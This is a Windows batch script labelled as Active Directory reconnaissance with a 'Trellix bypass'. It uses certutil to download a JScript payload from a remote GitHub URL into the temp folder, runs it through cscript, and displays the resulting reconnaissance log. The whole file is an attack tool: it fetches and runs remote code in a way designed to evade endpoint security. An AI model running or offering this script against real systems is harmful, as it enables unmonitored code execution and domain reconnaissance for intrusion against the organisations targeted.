@echo off
REM ===============================================
REM run_via_js.bat - Launch JS recon via cscript
REM Output: %TEMP%\ad_recon_js.log
REM ===============================================

set "OUT=%TEMP%"

echo.
echo === AD RECON via JScript (Trellix bypass) ===
echo Output: %OUT%\ad_recon_js.log
echo.

certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_js.js" "%OUT%\ad_recon.js" > nul 2>&1

if not exist "%OUT%\ad_recon.js" (
    echo [ERROR] Download failed. Trying local...
    if exist "%~dp0run_via_js.js" (
        copy /Y "%~dp0run_via_js.js" "%OUT%\ad_recon.js" > nul
    )
)

if exist "%OUT%\ad_recon.js" (
    cscript.exe //NoLogo "%OUT%\ad_recon.js" 2>&1
) else (
    echo [ERROR] No JS script available
)

echo.
echo ============================================
echo Done. Log at: %OUT%\ad_recon_js.log
echo ============================================
if exist "%OUT%\ad_recon_js.log" type "%OUT%\ad_recon_js.log"
pause
